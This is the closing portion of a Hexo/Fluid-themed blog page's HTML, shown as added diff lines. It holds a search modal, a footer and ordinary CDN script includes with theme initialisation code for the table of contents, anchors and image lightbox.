+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
